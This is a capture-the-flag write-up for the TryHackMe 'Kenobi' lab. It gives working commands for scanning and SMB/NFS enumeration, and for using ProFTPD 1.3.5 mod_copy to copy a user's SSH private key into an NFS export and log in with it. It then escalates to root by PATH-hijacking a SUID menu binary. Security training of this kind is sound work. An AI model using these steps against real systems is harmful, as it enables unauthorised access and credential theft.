# TryHackMe - Kenobi

[ROOM](https://tryhackme.com/room/kenobi)

## 1. Reconnaissance

I started by scanning the target using Nmap to identify open ports.

```bash
nmap -T4 10.48.190.52
```

The scan revealed the following open ports:

| Port | Service |
|---|---|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |
| 111 | RPCBind |
| 139 | NetBIOS |
| 445 | SMB |
| 2049 | NFS |

Next, I performed service and version detection:

```bash
nmap -sC -sV -p21,22,80,111,139,445,2049 10.48.190.52
```

The important findings were:

- FTP: ProFTPD 1.3.5
- SSH: OpenSSH 8.2p1
- HTTP: Apache 2.4.41
- SMB: Samba
- NFS: Available

The web server's `robots.txt` also revealed `/admin.html`, which could be investigated later.

## 2. SMB Enumeration

I enumerated the available SMB shares using `smbclient`.

```bash
smbclient -N -L //10.48.190.52
```

The server exposed an `anonymous` share that was accessible without authentication.

I connected to the share and downloaded `log.txt`.

```bash
smbclient //10.48.190.52/anonymous
```

Inside the SMB prompt:

```text
ls
get log.txt
exit
```

I saved the file locally for further analysis.

## 3. NFS Enumeration

Next, I checked for accessible NFS exports.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.190.52
```

The scan revealed that `/var` was exported:

```text
/var *
```

This was an important finding because the exported directory could later be used to retrieve a file copied into it on the target.

## 4. Exploiting ProFTPD 1.3.5

I connected to the FTP service to confirm its version.

```bash
nc 10.48.190.52 21
```

The server identified itself as ProFTPD 1.3.5. I researched the version and found that its `mod_copy` functionality supports the `SITE CPFR` and `SITE CPTO` commands, which can copy files between locations on the server when the relevant functionality is enabled.

Since the username `kenobi` was known, I attempted to copy its SSH private key into the NFS-exported directory.

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

The server returned:

```text
350 File or directory exists, ready for destination name
250 Copy successful
```

The successful copy placed the SSH private key at `/var/tmp/id_rsa`.

## 5. Retrieving the SSH Private Key Through NFS

I created a local mount point and mounted the target's exported `/var` directory.

```bash
sudo mkdir -p /mnt/kenobiNFS
sudo mount -t nfs -o vers=3 10.48.190.52:/var /mnt/kenobiNFS
```

I verified the mounted directory and copied the private key to my working directory.

```bash
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
```

After retrieving the key, I unmounted the NFS share.

```bash
sudo umount /mnt/kenobiNFS
```

Before using the private key, I restricted its permissions and connected over SSH.

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.48.190.52
```

This successfully provided access as `kenobi`.

## 6. Capturing the User Flag

After logging in, I listed the home directory and found `user.txt`.

```bash
ls
cat user.txt
```

**User flag obtained.**

## 7. Privilege Escalation

To identify potential privilege escalation paths, I searched for SUID binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```

Among the results, `/usr/bin/menu` stood out as an unusual executable.

I inspected its strings:

```bash
strings /usr/bin/menu
```

The output revealed that the program called system commands such as `curl`, `uname`, and `ifconfig`. This suggested that the executable might rely on commands resolved through the system's `PATH`.

I checked the current `PATH`:

```bash
echo $PATH
```

I then created a replacement executable named `curl` in `/tmp` and placed that directory first in `PATH`.

```bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

I ran the menu program again:

```bash
/usr/bin/menu
```

Selecting the relevant menu option caused the program to invoke the replacement command. Because the SUID executable ran with elevated privileges, this provided a root shell.

I verified the result:

```bash
whoami
```

The output was:

```text
root
```

**Root access obtained.**

